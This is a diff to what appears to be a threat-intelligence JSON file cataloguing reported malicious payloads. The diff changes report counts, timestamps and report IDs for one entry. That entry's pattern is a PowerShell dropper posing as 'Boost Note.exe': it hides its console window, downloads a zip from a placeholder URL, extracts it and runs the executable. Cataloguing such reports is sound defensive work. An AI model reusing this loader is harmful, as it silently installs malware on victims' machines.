@@ -802,13 +802,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 21,
-    "FirstSeen": "2026-11-17T01:35:14.437000+00:00",
+    "ReportCount": 18,
+    "FirstSeen": "2026-11-17T02:56:16.266000+00:00",
     "LastSeen": "2026-11-20T17:27:10.495000+00:00",
     "ReportIds": [
-      "cmwk0sutc19dk0omldqs77qbt",
-      "cmwk19p8v19fi0omldrlx19g0",
-      "cmwk1atw219gr0oml6sk6cbtv",
       "cmwk3p26p19uc0omlw8z2aok9",
       "cmwk7dpqm1bx70omli9yupclo",
       "cmwk7z4jk1cpj0oml1mhvj0hz",
